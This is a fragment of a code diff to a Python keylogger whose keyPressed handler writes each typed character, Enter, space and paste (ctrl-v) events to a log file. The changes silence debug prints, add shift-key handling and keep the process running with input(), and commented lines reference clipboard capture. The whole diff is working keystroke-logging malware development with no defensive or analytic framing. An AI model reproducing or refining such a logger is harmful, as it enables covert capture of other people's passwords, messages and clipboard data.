@@ -26,7 +26,7 @@ def keyPressed(key):
         try:
             char = key.char
             if char in string.printable:
-                print("printable")
+                #print("printable")
                 logKey.write(char)
             else:
                 char = char.encode('utf-8')
@@ -39,15 +39,19 @@ def keyPressed(key):
                     logKey.write("<ctrl-v>")
 
         except Exception as ex:
-            print(ex)
+            # print(ex)
             if str(key) == "Key.enter":
                 logKey.write("\n" + " "*29)
             elif str(key) == "Key.space":
                 logKey.write(" ")
+            elif str(key) == "Key.shift":
+                logKey.write("")
+            # elif str(key) == "Key.print_screen":
+            #     logKey.write("")
             elif "Key.ctrl_" in str(key):
-                pass
-            elif str(key) == "Key.backspace":
-                logKey.seek(logKey.tell()-1)
+                 pass
+            # elif str(key) == "Key.backspace":
+                # logKey.seek(logKey.tell()-1)
                 # logKey.write(" ")
                 # logKey.seek(logKey.tell()-1)
             else:
@@ -63,4 +67,4 @@ if __name__ == "__main__":
     # print(clipboard_contents)
     # listener = keyboard.Listener(on_press=keyPressed)
     # listener.start()
-    # input()
+    input()
